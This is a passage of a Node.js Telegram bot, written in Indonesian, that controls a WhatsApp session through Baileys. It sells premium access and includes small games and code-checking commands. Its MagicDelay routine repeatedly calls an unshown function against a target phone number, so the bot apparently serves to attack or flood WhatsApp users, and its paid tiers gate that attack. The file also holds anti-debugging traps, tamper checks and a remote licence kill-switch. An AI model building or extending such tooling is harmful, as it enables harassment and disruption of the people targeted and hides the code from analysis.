const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}
//------------------(TASK QUE SYSTEM)--------------------//
class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

//------------------(WAJIB DI ISI YAA)--------------------//
const thumbnailUrl = "https://files.catbox.moe/l3djrx.jpg";
const ThumbnailPairing = "https://files.catbox.moe/xh5q7j.jpg";
//-------------------------------------------------------------------------//
const databaseUrl = 'https://raw.githubusercontent.com/prantirahayu80-star/tuanfadz/refs/heads/main/token.json';

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function formatTarget(number) {
  if (!number) return null;

  // bersihin selain angka
  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

//------------------(FILTER - BEBAS SPAM)--------------------//
async function MagicDelay(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 3000; // ini delay ms nya serah mau berapaa rekomendasi udah tetep 3000 aja sih :)

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 3; i++) { // nih yang 3 itu lopp serah mau pake berapaa

    const loopStart = Date.now();

    try {
      await epcihDiley(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}📤 Succesfuly${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/3  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}⛔ Failed${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/3  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

//------------------(PREMIUM GROUP)--------------------//
// DB file auto dibuat
const PREM_GROUP_DB = path.join(__dirname, "premgb.json");

// --- helpers db ---
function loadPremGroups() {
  try {
    if (!fs.existsSync(PREM_GROUP_DB)) {
      fs.writeFileSync(PREM_GROUP_DB, JSON.stringify({ groups: [] }, null, 2));
    }
    const raw = fs.readFileSync(PREM_GROUP_DB, "utf8");
    const json = JSON.parse(raw);
    if (!json || !Array.isArray(json.groups)) return { groups: [] };
    return json;
  } catch {
    return { groups: [] };
  }
}

function savePremGroups(db) {
  fs.writeFileSync(PREM_GROUP_DB, JSON.stringify(db, null, 2));
}

function isPremGroup(chatId) {
  const db = loadPremGroups();
  return db.groups.includes(Number(chatId));
}

function addPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  if (!db.groups.includes(id)) db.groups.push(id);
  savePremGroups(db);
  return true;
}

function delPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  db.groups = db.groups.filter((g) => g !== id);
  savePremGroups(db);
  return true;
}

// --- middleware owner only ---
const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Khusus owner.", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

// --- middleware: premium group gate (pakai buat command premium) ---
const premGroupOnly = () => async (ctx, next) => {
  const chatType = ctx.chat?.type;
  if (chatType === "private") {
    return ctx.reply("❌ Command ini hanya bisa dipakai di grup premium.");
  }
  if (!isPremGroup(ctx.chat.id)) {
    const title = ctx.chat?.title || "Group ini";
    return ctx.reply(`❌ ☇ Grup <b>${escapeHtml(title)}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, {
      parse_mode: "HTML",
    });
  }
  return next();
};

// --- html escape biar aman ---
function escapeHtml(s = "") {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// ================================
// POINT SYSTEM TIC TAC TOE
// ================================
const POINTS_FILE = path.join(__dirname, "points.json");

function loadPoints() {
  try {
    if (!fs.existsSync(POINTS_FILE)) {
      fs.writeFileSync(POINTS_FILE, JSON.stringify({}, null, 2));
    }
    const raw = fs.readFileSync(POINTS_FILE, "utf8");
    return JSON.parse(raw || "{}");
  } catch {
    return {};
  }
}

function savePoints(data) {
  fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
}

function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);

  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0,
      win: 0,
      lose: 0,
      draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }

  savePoints(db);
  return db;
}

function addWinPoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 3;
  db[id].win += 1;
  savePoints(db);
}

function addLosePoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].lose += 1;
  savePoints(db);
}

function addDrawPoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 1;
  db[id].draw += 1;
  savePoints(db);
}

function getUserPoint(userId) {
  const db = loadPoints();
  return db[String(userId)] || null;
}

function getLeaderboard(limit = 10) {
  const db = loadPoints();
  return Object.values(db)
    .sort((a, b) => b.points - a.points)
    .slice(0, limit);
}

// ================================
// TIC TAC TOE
// ================================
const tttGames = new Map(); // chatId -> game

function tttNewBoard() {
  return Array(9).fill(null);
}

function tttWinner(board) {
  const lines = [
    [0,1,2],[3,4,5],[6,7,8],
    [0,3,6],[1,4,7],[2,5,8],
    [0,4,8],[2,4,6]
  ];

  for (const [a, b, c] of lines) {
    if (board[a] && board[a] === board[b] && board[a] === board[c]) {
      return board[a];
    }
  }
  return null;
}

function tttDraw(board) {
  return board.every(v => v !== null) && !tttWinner(board);
}

function tttCell(v) {
  if (v === "X") return "❌";
  if (v === "O") return "⭕";
  return "➖";
}

function tttSafeName(user) {
  return user?.username ? `@${user.username}` : (user?.first_name || "User");
}

function tttBoardKeyboard(chatId, gameId, board, locked = false) {
  const btn = (i) => ({
    text: tttCell(board[i]),
    callback_data: locked
      ? `tttnoop_${chatId}_${gameId}`
      : `tttmove_${chatId}_${gameId}_${i}`
  });

  return {
    inline_keyboard: [
      [btn(0), btn(1), btn(2)],
      [btn(3), btn(4), btn(5)],
      [btn(6), btn(7), btn(8)]
    ]
  };
}

function tttRender(game) {
  const xName = game.players.X ? tttSafeName(game.players.X) : "-";
  const oName = game.players.O ? tttSafeName(game.players.O) : "-";
  const turnUser = game.turn === "X" ? game.players.X : game.players.O;
  const turnName = turnUser ? tttSafeName(turnUser) : "-";

  return `🎮 <b>TIC TAC TOE</b>

❌ X : <b>${xName}</b>
⭕ O : <b>${oName}</b>

Giliran:
<b>${game.turn}</b> - ${turnName}`;
}

// ================================
// POINT SYSTEM SUIT BATU KERTAS 
// ================================
function savePoints(data) {
  fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
}

function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);

  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0,
      win: 0,
      lose: 0,
      draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }

  savePoints(db);
  return db;
}

function addSuitWin(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 2;
  db[id].win += 1;
  savePoints(db);
}

function addSuitLose(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].lose += 1;
  savePoints(db);
}

function addSuitDraw(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].draw += 1;
  savePoints(db);
}

// ================================
// SUIT GAME
// ================================
const suitGames = new Map(); // chatId -> game

function suitName(user) {
  return user?.username ? `@${user.username}` : (user?.first_name || "User");
}

function suitChoiceLabel(choice) {
  if (choice === "rock") return "🪨 Batu";
  if (choice === "paper") return "📄 Kertas";
  if (choice === "scissors") return "✂️ Gunting";
  return "-";
}

function suitWin(a, b) {
  if (a === b) return "draw";
  if (
    (a === "rock" && b === "scissors") ||
    (a === "paper" && b === "rock") ||
    (a === "scissors" && b === "paper")
  ) return "p1";
  return "p2";
}

function suitPickKeyboard(chatId, gameId) {
  return {
    inline_keyboard: [
      [
        { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gameId}_rock` },
        { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gameId}_paper` },
        { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gameId}_scissors` }
      ]
    ]
  };
}

// ================= AUTO FIX FUNCTION ================= //
function autoFixJS(code) {
  let fixed = code;

  // 1. hapus koma berlebih
  fixed = fixed.replace(/,\s*([}\]])/g, "$1");

  // 2. tambah ; sederhana
  fixed = fixed.replace(/([^\n;{}])\n/g, "$1;\n");

  // 3. balance kurung {}
  let open = (fixed.match(/{/g) || []).length;
  let close = (fixed.match(/}/g) || []).length;

  while (close < open) {
    fixed += "\n}";
    close++;
  }

  // 4. balance ()
  let o = (fixed.match(/\(/g) || []).length;
  let c = (fixed.match(/\)/g) || []).length;

  while (c < o) {
    fixed += ")";
    c++;
  }

  return fixed;
}

// ================= COMMAND FIX ERROR ================= //
bot.command("fixerror", async (ctx) => {
  try {
    const msg = ctx.message.reply_to_message;

    if (!msg || !msg.document) {
      return ctx.reply("❌ Reply file .js");
    }

    const doc = msg.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus JavaScript (.js)");
    }

    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const tempPath = path.join(__dirname, `fix_${Date.now()}.js`);

    const res = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

    fs.writeFileSync(tempPath, res.data);

    let code = fs.readFileSync(tempPath, "utf8");

    let errorBefore = null;

    try {
      new Function(code);
    } catch (err) {
      errorBefore = err.message;
    }

    // fix code
    const fixedCode = autoFixJS(code);

    let errorAfter = null;

    try {
      new Function(fixedCode);
    } catch (err) {
      errorAfter = err.message;
    }

    const fixedPath = path.join(__dirname, `fixed_${Date.now()}.js`);
    fs.writeFileSync(fixedPath, fixedCode);

    // ================= RESULT ================= //
    let result = `<b>📦 FIX ERROR RESULT</b>\n\n`;

    if (!errorBefore) {
      result += "✅ Tidak ada error dari awal.";
    } else {
      result += `❌ Error sebelum:\n<pre>${errorBefore}</pre>\n\n`;

      if (!errorAfter) {
        result += "✅ Berhasil diperbaiki!";
      } else {
        result += `⚠️ Masih ada error:\n<pre>${errorAfter}</pre>`;
      }
    }

    await ctx.reply(result, { parse_mode: "HTML" });

    // kirim file hasil fix
    await ctx.replyWithDocument({
      source: fixedPath,
      filename: "fixed.js"
    });

    fs.unlinkSync(tempPath);

  } catch (err) {
    console.log("FIX ERROR:", err.message);
    ctx.reply("❌ Gagal proses.");
  }
});

// ================= COMMAND CHECK ERROR ================= //
bot.command("CheckError", async (ctx) => {
  try {
    const msg = ctx.message.reply_to_message;

    if (!msg || !msg.document) {
      return ctx.reply("❌ Reply file JavaScript (.js)");
    }

    const doc = msg.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus format .js");
    }

    const fileLink = await ctx.telegram.getFileLink(doc.file_id);

    const tempPath = path.join(__dirname, `check_${Date.now()}.js`);

    // download file
    const res = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

    fs.writeFileSync(tempPath, res.data);

    const code = fs.readFileSync(tempPath, "utf8");

    let output;

    try {
      new Function(code);
      output = "✅ <b>Tidak ditemukan syntax error</b>";
    } catch (err) {
      output = `
❌ <b>Error ditemukan</b>

<pre>${err.message}</pre>
      `;
    }

    await ctx.reply(
      `<b>📦 HASIL CHECK ERROR</b>\n\n${output}`,
      { parse_mode: "HTML" }
    );

    fs.unlinkSync(tempPath);

  } catch (err) {
    console.log("CHECK ERROR:", err.message);
    ctx.reply("❌ Terjadi error saat proses.");
  }
});

bot.command('cekemoji', async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply) {
    return ctx.reply(`
❌ Reply pesan yang berisi emoji premium.

Contoh:
- User kirim emoji premium
- Reply emoji tersebut dengan command /cekemoji
    `);
  }

  const emojis = [];

  if (reply.entities) {
    reply.entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({
          id: entity.custom_emoji_id
        });
      }
    });
  }

  if (reply.caption_entities) {
    reply.caption_entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({
          id: entity.custom_emoji_id
        });
      }
    });
  }

  if (emojis.length === 0) {
    return ctx.reply(`
❌ Tidak ada custom emoji terdeteksi.

Gunakan command ini dengan reply ke pesan yang berisi emoji premium Telegram.
    `);
  }

  let result = `
<b>╔════════════════════╗
   CUSTOM EMOJI FOUND
╚════════════════════╝</b>
`;

  emojis.forEach((e, i) => {
    result += `

<b>• Emoji ${i + 1}</b>
<code>${e.id}</code>

<b>Format Pakai:</b>
<code>&lt;tg-emoji emoji-id="${e.id}"&gt;✨&lt;/tg-emoji&gt;</code>
`;
  });

  result += `

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>Total Emoji:</b> ${emojis.length}
`;

  await ctx.reply(result, {
    parse_mode: "HTML"
  });
});

//---------(HANDLER BLOCK CMD ) ---------//
const BLOCKCMD_FILE = path.join(__dirname, "blocked_commands.json");

let blockedCommands = [];

function loadBlockedCommands() {
  try {
    if (fs.existsSync(BLOCKCMD_FILE)) {
      const raw = fs.readFileSync(BLOCKCMD_FILE, "utf8");
      const parsed = JSON.parse(raw);

      if (Array.isArray(parsed)) {
        blockedCommands = parsed.map(cmd => String(cmd).toLowerCase().trim());
      } else {
        blockedCommands = [];
      }
    } else {
      blockedCommands = [];
    }
  } catch (err) {
    console.error("Gagal load blocked commands:", err.message);
    blockedCommands = [];
  }
}

function saveBlockedCommands() {
  try {
    fs.writeFileSync(BLOCKCMD_FILE, JSON.stringify(blockedCommands, null, 2));
  } catch (err) {
    console.error("Gagal save blocked commands:", err.message);
  }
}

function normalizeCommandName(input) {
  return String(input || "")
    .trim()
    .toLowerCase()
    .replace(/^\//, "");
}

function isCommandBlocked(commandName) {
  const normalized = normalizeCommandName(commandName);
  return blockedCommands.includes(normalized);
}

loadBlockedCommands();

//---------(HANDLER APPROVED GB ) ---------//
const APPROVED_GROUPS_FILE = path.join(__dirname, "approved_groups.json");

let approvedGroups = [];
let pendingGroups = new Map();

function loadApprovedGroups() {
  try {
    if (fs.existsSync(APPROVED_GROUPS_FILE)) {
      const raw = fs.readFileSync(APPROVED_GROUPS_FILE, "utf8");
      const parsed = JSON.parse(raw);
      approvedGroups = Array.isArray(parsed) ? parsed : [];
    } else {
      approvedGroups = [];
    }
  } catch (err) {
    console.error("Gagal load approved groups:", err.message);
    approvedGroups = [];
  }
}

function saveApprovedGroups() {
  try {
    fs.writeFileSync(APPROVED_GROUPS_FILE, JSON.stringify(approvedGroups, null, 2));
  } catch (err) {
    console.error("Gagal save approved groups:", err.message);
  }
}

function isOwner(userId) {
  return String(userId) === String(ownerID);
}

function isGroupApproved(chatId) {
  return approvedGroups.includes(String(chatId));
}

loadApprovedGroups();

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
    console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
`));

const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ X-HUNTER ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Sudah Terhubung
╘—————————————————═⬡
</pre></blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
            
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Sender Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
`));

        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addpairing", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
